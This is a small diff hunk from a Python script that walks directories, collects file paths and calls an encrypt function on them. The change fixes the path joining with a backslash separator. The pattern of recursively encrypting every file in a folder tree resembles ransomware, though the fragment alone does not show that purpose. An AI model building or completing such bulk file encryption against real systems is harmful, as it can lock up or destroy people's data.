@@ -67,7 +67,7 @@ if __name__ == '__main__':
                     if os.path.isdir(path+item):
                         directories.add(path+item)
                     else:
-                        files.add(path+item) 
+                        files.add(path+"\\"+item) 
                 encrypt(files, key)
 
             except Exception as e:
